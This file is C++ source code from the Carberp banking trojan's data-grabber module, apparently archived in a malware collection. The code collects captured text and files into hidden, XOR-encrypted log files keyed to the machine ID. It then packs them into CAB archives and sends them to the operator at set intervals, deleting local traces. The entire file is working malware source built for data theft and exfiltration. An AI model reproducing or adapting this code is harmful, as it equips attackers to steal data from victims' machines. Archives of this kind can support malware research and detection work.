/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------

#pragma hdrstop

#include "BotCore.h"
#include "Grabbers.h"
#include "Utils.h"
#include "StrConsts.h"
#include "CabPacker.h"
#include "Loader.h"

//---------------------------------------------------------------------------

// ������ ���������� ������ �������
char GrabberPassword[5] = {0};

const char* GrabbersWorkWolder = "NGWF";
const char* GrabbersFileExt    = ".ngdf";

//-------------------------------------------
//  GetGrabbersPath - ������� ��������� ���
//                �������� �������� �������
//-------------------------------------------
string GetGrabbersPath()
{
	return BOT::MakeFileName(GrabbersWorkWolder, NULL);
}

//-------------------------------------------
//  GetGrabberFileName - ������� ������ ���
//                       ����� �������.
//-------------------------------------------
string GetGrabberFileName(const string& GrabberName)
{
	string Tmp = (!GrabberName.IsEmpty()) ? GrabberName : Random::RandomString2(10, 'A', 'Z');
	DWORD Hash = Tmp.Hash();
	string ShortName;
    ShortName.LongToStr(Hash);
	ShortName += GrabbersFileExt;
	string Name = GetGrabbersPath();
	Name += ShortName;
	return Name;
}


//-------------------------------------------
// ������� ���������� ������ ����������
// ������ �������
//-------------------------------------------
PCHAR MakeGrabberFilePassword()
{
	if (!GrabberPassword[0])
	{
		// ���������� ������
		m_memset(GrabberPassword, 0, sizeof(GrabberPassword));
		PCHAR ID = MakeMachineID();
		DWORD Hash = STRA::Hash(ID);
		string Temp;
		WORD NW = LOWORD(Hash) + HIWORD(Hash);
		Temp.Format("%X", NW);
		m_memcpy(GrabberPassword, Temp.t_str(), 4);
    }
	return GrabberPassword;
}





// �������� ��������� ����� �������
#pragma pack(push, 1)
struct TGrabberFileHead
{
	DWORD Signature;    // ��������� �����
	DWORD Version;      // ������ �����
	DWORD Type;         // ��� �����
	DWORD Flags;        // ����� �����
	DWORD FlagsEx;      // �������������� �����
	DWORD PID;          // ������������� �������� ���������� ���
	bool  Closed;       // ������� ����, ��� ��� ������ � ��� ����� ����������
	bool  SendAsCAB;    // ������� ������������� ��������  ���� CAB �������
	DWORD SendInterval; // �������� �������, � ������� ���������� ���������
						// �����, �� ��������� �������� ��� ����� ���������
};
#pragma pack(pop)


// �������� ��������� ����� ������ �������
#pragma pack(push, 1)
struct TGrabberBlockHead
{
	DWORD Signature;  // ��������� �����
	DWORD Type;       // ��� ������ �����
	DWORD DataSize;   // ������ ������ �����
	HWND  Wnd;        // ������������� ���� ���������� ����
};
#pragma pack(pop)




//=============================================================================
//  TGrabberFile - ������� ����� ��� ������ � ������
//                 �������
//=============================================================================
TGrabberFile::TGrabberFile(const string& GrabberName, const char* FileName, bool AutoActivate)
{
	Initialize(GrabberName, FileName, AutoActivate);
}

TGrabberFile::TGrabberFile(const string& GrabberName)
{
	Initialize(GrabberName, NULL, false);
}


TGrabberFile::~TGrabberFile()
{
	CloseFile();
	delete FBlocks;
}

//-------------------------------------------
//  ������� �������������� ������ �����
//-------------------------------------------
void TGrabberFile::Initialize(const string& GrabberName, const char* FileName, bool AutoActivate)
{
	FBlocks = new TBotCollection();
	FGrabberName = GrabberName;
	if (STRA::IsEmpty(FileName))
		FFileName = GetGrabberFileName(GrabberName);
	else
		FFileName = FileName;
	FPassword = MakeGrabberFilePassword();
	FStream = NULL;

	FPID  = Bot->PID();
	FType = 0;
	FClosed = false;
	FSendAsCAB = false;
	FSendInterval = GRABBER_SEND_INTERVAL;
	FIsEmpty = false;

	if (AutoActivate) Activate(NULL);
}


//-------------------------------------------
// ������� ��������� ������ ���� � ������
// ������ ��� ������
//-------------------------------------------
bool TGrabberFile::Active()
{
	return FStream != NULL;
}


//-------------------------------------------
// CloseLog - ������� ��������� ���.
// ����� �������� ���� ���� ���� �� �����
// �������� �� ����� �������
//-------------------------------------------
void TGrabberFile::CloseLog()
{
	if (!Active()) Open();
	if (!Active()) return;

	// �������� ��� ��� ������� � ��������� ���
	FClosed = true;
	UpdateFileHeader(false);
	CloseFile();

	// ��������������� ����. ������ ��������� ���
	string NewName;
	do
	{
		NewName = GetGrabbersPath();
		NewName += Random::RandomString2(9, 'a', 'z');
		NewName += GrabbersFileExt;
	}
	while (File::IsExists(NewName.t_str()));

	pMoveFileA(FFileName.t_str(), NewName.t_str());
	FFileName = NewName;
}


//-------------------------------------------
// CloseFile - ������� ��������� ��������
//             ����
//-------------------------------------------
void TGrabberFile::CloseFile()
{
	if (FStream)
	{
		delete FStream;
		FStream = NULL;
    }
}

//-------------------------------------------
//  Create - ������� ������ ���� �������
//-------------------------------------------
bool TGrabberFile::Create()
{
	// ��������� �������� ����
	CloseFile();

	// ��������� ����
	TBotFileStream *Stream = new TBotFileStream(FFileName.t_str(), fcmCreate | fcmReadWrite);
	if (!Stream->Valid())
	{
		delete Stream;
		return false;
	}

    // ���� ������� ������
	FStream = Stream;
	if (!UpdateFileHeader(true))
	{
		// � ������ ������ ��������� ���� � ������� ���
		CloseFile();
		pDeleteFileA(FFileName.t_str());
    }

	return FStream != NULL;
}


//-------------------------------------------
// Open - ������� ��������� ����� ���������
//        ���� �������
//-------------------------------------------
bool TGrabberFile::Open()
{
	// ��������� �������� ����
	CloseFile();

	// ��������� ����
	TBotFileStream *Stream = new TBotFileStream(FFileName.t_str(), fcmReadWrite);
	if (!Stream->Valid())
	{
		delete Stream;
		return false;
	}

	FStream = Stream;
	// ���� ������� ������, ����� ���������
	TGrabberFileHead H;
	ClearStruct(H);

	bool Result = FStream->Read(&H, sizeof(H)) == sizeof(H);
	if (Result)
	{
		// ��������� ���������
		Result = H.Signature == GRABBER_FILE_SIGNATURE;

		// ��������� ������
		if (Result)
			Result = H.Version == GRABBER_FILE_VERSION;

		if (Result)
		{
			FType         = H.Type;
			FClosed       = H.Closed;
			FSendAsCAB    = H.SendAsCAB;
			FSendInterval = H.SendInterval;
			FPID          = H.PID;

			// ������ ��� �������
			Result = ReadSizedString(FGrabberName);

			// ���������� ������� ������ ������ ������
			FBlocksStart = FStream->Position();
		}
	}

	if (!Result)
		CloseFile();

	return Result;
}

//-------------------------------------------
//  Activate - ������� ��������� ���� �������.
//  ���� ��� ���, �� �� ����� �������������
//  ������.
//  Created - �������� �� ����������, ����
//  ����� ������ ������� ����, ��� ���� ������
//-------------------------------------------
bool TGrabberFile::Activate(bool* Created)
{
	if (Created) *Created = false;
	bool Result = Open();
	if (!Result)
	{
		Result = Create();
		if (Created) *Created = Result;
    }
	return Result;
}


//-------------------------------------------
// CanSend - ������� ���������� ������ ����
// ���� ����� ���������.
//
// OpenFile -  �������� ����, ����� ���������
// ���������� ������� ����
//-------------------------------------------
bool TGrabberFile::CanSend(bool OpenFile)
{
	if (!Active() && OpenFile)
		Open();
	if (!Active()) return false;

	// ��������� ������� ��������� ����
	if (FClosed) return true;

	// ��������� ����� ���������� ��������� �����
	if (FSendInterval)
	{
		DWORD LastWriteInterval = File::LastWriteTime(FStream->Handle());
		if (LastWriteInterval && LastWriteInterval >= FSendInterval)
			return true;
	}

	return false;
}

//-------------------------------------------
//  DeleteFile - ������� ��������� ���� �
//               ������� ���
//-------------------------------------------
void TGrabberFile::DeleteFile()
{
	CloseFile();
	pDeleteFileA(FFileName.t_str());
}

//-------------------------------------------
// UpdateFileHeader - ������� ���������
// ��������� ����� �������
//-------------------------------------------
bool TGrabberFile::UpdateFileHeader(bool WriteName)
{
	if (!Active()) return false;

	TGrabberFileHead H;
	ClearStruct(H);

	H.Signature    = GRABBER_FILE_SIGNATURE;
	H.Version      = GRABBER_FILE_VERSION;
	H.Type         = FType;
	H.PID          = FPID;
	H.Closed	   = FClosed;
	H.SendAsCAB    = FSendAsCAB;
	H.SendInterval = FSendInterval;

    FStream->Seek(0, SO_BEGIN);

	bool Result = FStream->Write(&H, sizeof(H)) == sizeof(H);

	if (Result && WriteName)
		Result = WriteSizedString(FGrabberName);

	return Result;
}


//-------------------------------------------
//  WriteData - ������� ���������� ����
//              ������.
//-------------------------------------------
bool TGrabberFile::WriteData(LPVOID Data, DWORD Size, bool WriteSize, bool AllocMemForCrypt)
{
	if (!FStream) return false;
	bool Result = true;
    if (WriteSize)
		Result = FStream->Write(&Size, sizeof(Size)) == sizeof(Size);

	if (Result && Size)
	{
		// �������� ������ �� ��������� ����� � ������� ��
		LPVOID CryptedBuf = Data;
		DWORD  CryptedSize = (AllocMemForCrypt) ? Size : 0;
		TMemory M(CryptedSize);
		if (AllocMemForCrypt)
		{
			M.Write(Data, Size);
			CryptedBuf = M.Buf();
		}

		// ������� ������
		XORCrypt::Crypt(FPassword, (LPBYTE)CryptedBuf, Size);
		// ����������
		Result = FStream->Write(CryptedBuf, Size) == Size;
	}

	return Result;
}

//-------------------------------------------
//  ������� ���������� ������ � ��������
//-------------------------------------------
bool TGrabberFile::WriteSizedString(const string &Str)
{
	return WriteData(Str.t_str(), Str.Length(), true, true);
}


//-------------------------------------------
//  ReadData - ������� ������ ���� ������
//  ��������  DataSize � ����� Buf
//-------------------------------------------
bool TGrabberFile::ReadData(LPVOID Buf, DWORD DataSize)
{
	if (!FStream) return false;
	if (!DataSize) return true;

	bool Result = FStream->Read(Buf, DataSize) == DataSize;
	if (Result)
	{
		// �������������� ������
		XORCrypt::Crypt(FPassword, (LPBYTE)Buf, DataSize);
	}
	return Result;
}

//-------------------------------------------
//  ������� ������ ������ ���������� �������
//-------------------------------------------
bool TGrabberFile::ReadString(DWORD StringSize, string &Str)
{
	if (!FStream) return false;
	Str.SetLength(StringSize);
	bool Result = ReadData(Str.t_str(), StringSize);
	if (!Result) Str.Clear();
	return Result;
}

//-------------------------------------------
//  ������� ������ ������ ����� �������
//  ������� � ������
//-------------------------------------------
bool TGrabberFile::ReadSizedString(string &Str)
{
	if (!FStream) return false;
	DWORD Size;
	bool Result = FStream->Read(&Size, sizeof(Size)) == sizeof(Size);
	if (Result)
		Result = ReadString(Size, Str);
	return Result;
}

//-------------------------------------------
// SetSendInterval - ������� ����� ��������
//  �������� ����� �������� ������ ��
//  �������� ����
//  �������� ������ ���������� ���� �����
//  ��������� ����, ���� ����� �������� ���
//  ��������
//-------------------------------------------
void TGrabberFile::SetSendInterval(DWORD Interval) /* ����������� */
{
	FSendInterval = Interval;
	UpdateFileHeader(false);
}

//-------------------------------------------
// SetSendAsCAB ������� ����� �������������
// �������� ���� CAB �������
//-------------------------------------------
void TGrabberFile::SetSendAsCAB(bool SendAsCAB)
{
	FSendAsCAB = SendAsCAB;
	UpdateFileHeader(false);
}



//-------------------------------------------
// ������� ��������� ��������� ������
//-------------------------------------------
bool TGrabberFile::AddText(const string& Name, const string& Data)
{
	if (!Active() || Name.IsEmpty() || Data.IsEmpty())
		return false;
	TGrabberBlock B(this);
	return B.WriteText(Name, Data, false);
}

//-------------------------------------------
//  ������� ��������� ����� ��������� ������
//-------------------------------------------
bool TGrabberFile::AddTextPart(HWND Wnd, const string& Name, const string& Data)
{
	if (!Active() || Name.IsEmpty() || Data.IsEmpty())
		return false;
	TGrabberBlock B(this);
	B.FWND = Wnd;
	return B.WriteText(Name, Data, true);
}

//-------------------------------------------
// ������� ��������� ���� � ���
//-------------------------------------------
bool TGrabberFile::AddFile(const string& Name, const string& FileName, PCHAR SubDir, PCHAR InternalName)
{
	TGrabberBlock B(this);
	return B.WriteFile(Name, FileName, SubDir, InternalName);
}


//-------------------------------------------
//  ������� �������� ����� ������
//-------------------------------------------
bool TGrabberFile::ReadBlocks()
{
	FIsEmpty = false;
	if (!Active()) return false;
	FBlocks->Clear();

	// ��������� � ������ ������� �����
	FStream->Seek(FBlocksStart, SO_BEGIN);

	while (true)
	{
		TGrabberBlock* Block = new TGrabberBlock(this);

		// ������ ������
		if (!Block->Read())
		{
			// ������ ������ �����.
			delete Block;
			break;
		}

		if (!Block->FIgnoreBlock)
			Block->SetOwner(FBlocks);
		else
			delete Block;
    }

	FIsEmpty = FBlocks->Count() == 0;

	return FBlocks->Count() > 0;
}

//-------------------------------------------
//  ������� ����������� ��������� �����
//-------------------------------------------
string TGrabberFile::DoPackTextData()
{
	string Result;
	int Count = FBlocks->Count();
	if (Count > 0)
	{
		TBotStrings S;
        S.ValueDelimeter = ": ";
		for (int i = 0; i < Count; i++)
		{
			TGrabberBlock* Block = (TGrabberBlock*)FBlocks->Items(i);;
			if (Block->FDataType != GRABBER_DATA_TEXT && Block->FDataType != GRABBER_DATA_TEXTPART )
				continue;
            S.AddValue(Block->FName, Block->FAsString);
		}
		if (S.Count() > 0)
			Result = S.GetText();
    }

	return Result;
}

//-------------------------------------------
//  ������� ��������� ����� ���� � ��� �����
//-------------------------------------------
bool TGrabberFile::DoPackFilesToCab(LPVOID Cab)
{
	bool Result = false;
	for (int i = 0; i < FBlocks->Count(); i++)
	{
		TGrabberBlock* Block = (TGrabberBlock*)FBlocks->Items(i);;
		if (Block->FDataType != GRABBER_DATA_FILE)
			continue;
		// ��������� ����
		if (AddFileToCab(Cab, Block->FTempFileName.t_str(), Block->FInternalFileName.t_str()))
        	Result = true;
	}
	return Result;
}



//-------------------------------------------
// PackToCAB - ������� ������������ ������
//             � ��� �����.
// � ������ ������ ������� ���������� ���
// ���� � ��� �������
//-------------------------------------------
string TGrabberFile::PackToCAB()
{
	string FileName;
	if (ReadBlocks())
	{
		FileName = File::GetTempName2A();
		LPVOID Cab = CreateCab(FileName.t_str());
		if (Cab)
		{
			bool Result = false;
			// ������������ ��������� ������
			string TextLog = DoPackTextData();
			if (!TextLog.IsEmpty())
			{
				Result = AddStringToCab(Cab, TextLog, GetStr(StrLogFileTextData));

            }

			// ��������� �����
			if (DoPackFilesToCab(Cab))
            	Result = true;

            // ��������� ���
			CloseCab(Cab);

			// � ������ ������������� ���������� ������� ���
			if (!Result)
			{
				pDeleteFileA(FileName.t_str());
                FileName.Clear();
            }
		}
    }

    return FileName;
}

//-------------------------------------------
//  ������� ���������� ���� �� �����
//-------------------------------------------
TGrabberBlock* TGrabberFile::GetBlockByName(const string& Name)
{
	for (int i = FBlocks->Count() - 1; i >= 0 ; i--)
	{
		TGrabberBlock* Block = (TGrabberBlock*)FBlocks->Items(i);
		if (Block->FName == Name)
			return Block;
	}
	return NULL;
}


//-------------------------------------------
// SendLog - ������� ���������� ��� � �������
//-------------------------------------------
bool TGrabberFile::SendLog(bool DeleteLog)
{
	if (!Active()) return false;

	// ��������� CAB �����
	bool CabSended = false;
	if (FSendAsCAB)
	{
		string CAB = PackToCAB();
		if (!CAB.IsEmpty())
		{
			// �o� ��������. ����������
			CabSended = DataGrabber::SendCab(NULL, CAB.t_str(), FGrabberName.t_str(), NULL);

			pDeleteFileA(CAB.t_str());
        }
	}
	else
		CabSended = true;

	bool Result = CabSended;

	if (FIsEmpty || (Result && DeleteLog))
		DeleteFile();

	return Result;
}





//=============================================================================
//  TGrabberBlock - ���� ������ �������
//=============================================================================
TGrabberBlock::TGrabberBlock(TGrabberFile* File)
	: TBotCollectionItem(NULL)
{
	Initialize();
	FFile = File;
}

TGrabberBlock::~TGrabberBlock()
{
	Clear();
}

//-------------------------------------------
// ������� �������������� ���������� ������
//-------------------------------------------
void TGrabberBlock::Initialize()
{
	FDataSize = 0;
	FDataType = 0;
}


//-------------------------------------------
//  Write - ������� ���������� ������ �����
//          � ����
//-------------------------------------------
bool TGrabberBlock::Write(LPVOID Data, DWORD DataSize, bool AllocMemForCrypt)
{
	if (!FFile || !FFile->Active())
		return false;

	// ��������� � ����� �����
	FFile->FStream->Seek(0, SO_END);

	// ���������� ��������� �����
	TGrabberBlockHead H;
	H.Signature = GRABBER_FILE_BLOCK_SIGNATURE;
	H.Type      = FDataType;
	H.DataSize  = DataSize;
	H.Wnd       = FWND;

	// ����� ���������
	bool Result = FFile->FStream->Write(&H, sizeof(H)) == sizeof(H);

	// ���������� ��� �����
	if (Result)
		Result = FFile->WriteSizedString(FName);

	if (Result && FDataType == GRABBER_DATA_FILE)
	{
		// � ������ ������ ����� ����� ����� ������
		Result = FFile->WriteSizedString(FFileName) &&
				 FFile->WriteSizedString(FInternalFileName);
	}

	// ����� ������
	if (Result)
		Result = FFile->WriteData(Data, DataSize, false, AllocMemForCrypt);

	return Result;
}


//-------------------------------------------
// Read - ������� ������ ������ �����
//-------------------------------------------
bool TGrabberBlock::Read()
{
	if (!FFile || !FFile->Active())
		return false;

	Clear();

	// ������ ��������� �����
	TGrabberBlockHead H;
	ClearStruct(H);

	// ������ ���������
	bool Result = FFile->FStream->Read(&H, sizeof(H)) == sizeof(H);

    // ��������� ��������� �����
	if (Result)
		Result = H.Signature == GRABBER_FILE_BLOCK_SIGNATURE;

	// ������ ��� �����
	if (Result)
		Result = FFile->ReadSizedString(FName);


	if (Result && H.Type == GRABBER_DATA_FILE)
	{
		// � ������ ������ ����� ������ ����� ������
		Result = FFile->ReadSizedString(FFileName) &&
				 FFile->ReadSizedString(FInternalFileName);
	}

	// ������ ������
	if (Result)
	{
		FDataType = H.Type;
		FDataSize = H.DataSize;
		FWND      = H.Wnd;

		Result = ReadBlockData();
    }


	return Result;
}

//-------------------------------------------
// ������� ������ ������ �����
//-------------------------------------------
bool TGrabberBlock::ReadBlockData()
{
	if (!FDataSize)
	{
		// ������ ����� ����������
		FIgnoreBlock = true;
		return true;
	}

	switch (FDataType)
	{
		// ������ ��������� ����
		case GRABBER_DATA_TEXT:     return DoReadTextData();
		case GRABBER_DATA_TEXTPART: return DoReadTextData();
		case GRABBER_DATA_FILE:     return DoReadFileData();
	}

	// ��� ������������������� �����������, ������ ��� ������� �������� ������
	// ��� ��������� �������������� ��������� ���� � �����
	FAsBlob = (LPBYTE)MemAlloc(FDataSize + 1);
	*(FAsBlob + FDataSize) = 0;
	return FFile->ReadData(FAsBlob, FDataSize);
}


//-------------------------------------------
//  ������� ������ ��������� ������
//-------------------------------------------
bool TGrabberBlock::DoReadTextData()
{
	// ��� ������ ��������� ������ ��������� ����� �� �������������
	// ��������� �����.
	bool Result = FFile->ReadString(FDataSize, FAsString);
	if (Result)
	{
		TGrabberBlock* Block = FFile->GetBlockByName(FName);
		if (Block)
		{
			if (Block->FDataType == GRABBER_DATA_TEXT && FDataType == GRABBER_DATA_TEXT)
			{
				// � ������ ���� ��� ��� ��������� �����, ��������
				// ������ ������ ������
				FIgnoreBlock = true;
				Block->FAsString = FAsString;
			}
			else
			if (Block->FDataType == GRABBER_DATA_TEXTPART && FDataType == GRABBER_DATA_TEXTPART)
			{
				FIgnoreBlock = true;
				if (!FWND || Block->FWND == FWND)
					Block->FAsString += FAsString;
				else
				{
					Block->FWND = FWND;
					Block->FAsString = FAsString;
                }
			}
		}
	}
	return Result;
}

//-------------------------------------------
// ������� ������ ������ �����
//-------------------------------------------
bool TGrabberBlock::DoReadFileData()
{
	LPVOID Buf = MemAlloc(FDataSize);
	bool Result = FFile->ReadData(Buf, FDataSize);
	if (Result)
	{
		TGrabberBlock* Block = FFile->GetBlockByName(FName);
		if (Block)
		{
			// ����� ���� ��� ����������
			FIgnoreBlock = true;
            File::WriteBufferA(Block->FTempFileName.t_str(), Buf, FDataSize);
		}
		else
		{
			FTempFileName = File::GetTempName2A();
			File::WriteBufferA(FTempFileName.t_str(), Buf, FDataSize);
        }
    }

	MemFree(Buf);
	return Result;
}



//-------------------------------------------
//  Clear - ������� ������� ������ �����
//-------------------------------------------
void TGrabberBlock::Clear()
{
	if (FAsBlob) MemFree(FAsBlob);
	FName.Clear();
	FFileName.Clear();
	FInternalFileName.Clear();
	FAsString.Clear();
	FDataSize = 0;
	FDataType = 0;
	FWND = 0;
	FIgnoreBlock = false;
	if (!FTempFileName.IsEmpty())
	{
		pDeleteFileA(FTempFileName.t_str());
		FTempFileName.Clear();
	}
}

//-------------------------------------------
//  WriteText - ������� ���������� � ����
//              ��������� ����
//-------------------------------------------
bool TGrabberBlock::WriteText(const string& Name, const string& Data, bool IsTextPart)
{
	Clear();
	FName     = Name;
	if (IsTextPart)
		FDataType = GRABBER_DATA_TEXTPART;
	else
		FDataType = GRABBER_DATA_TEXT;
	return Write(Data.t_str(), Data.Length(), true);
}

//-------------------------------------------
//  ������� ��������� ��������� ���� � ���
//-------------------------------------------
bool TGrabberBlock::WriteFile(const string& Name, const string& FileName, PCHAR SubDir, PCHAR InternalName)
{
	if (!FFile || !FFile->Active())
		return false;

	Clear();

	bool Result = false;
	LPBYTE Buf  = File::ReadToBufferA(FileName.t_str(), FDataSize);
	if (Buf)
	{
		FName = Name;

		// ������ ����� ������
		FFileName = File::ExtractFileNameA(FileName.t_str(), false);

		if (FName.IsEmpty())
			FName = FFileName;

		// ������ ��� ��� ��� ������
		if (!STRA::IsEmpty(InternalName) || !STRA::IsEmpty(SubDir))
		{

			if (STRA::IsEmpty(InternalName))
				InternalName = FFileName.t_str();

			FInternalFileName = CombineFileName(SubDir, InternalName);
		}


		FDataType = GRABBER_DATA_FILE;
		Result    = Write(Buf, FDataSize, false);

		MemFree(Buf);
    }
    return Result;
}


//=============================================================================
//  TGrabberFileSender ����� �������� �����
//=============================================================================
TGrabberFileSender::TGrabberFileSender()
{
	FWorkPath = GetGrabbersPath();
	FMask = "*";
	FMask += GrabbersFileExt;
}

TGrabberFileSender::~TGrabberFileSender()
{

}


void LogSenderSearchFiles(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel)
{
	((TBotStrings*)Data)->Add(FileName);
}


void TGrabberFileSender::SendFiles()
{
	// �������� ������ ������������ �����
	TBotStrings Files;
	SearchFiles(FWorkPath.t_str(), FMask.t_str(), false, FA_ANY_FILES, &Files, LogSenderSearchFiles);

	// ���������� ����
	for (int i = 0; i < Files.Count(); i++)
	{
		string FileName = Files[i];
		TGrabberFile File("", FileName.t_str(), false);
		if (File.CanSend(true))
			File.SendLog(true);
	}
}
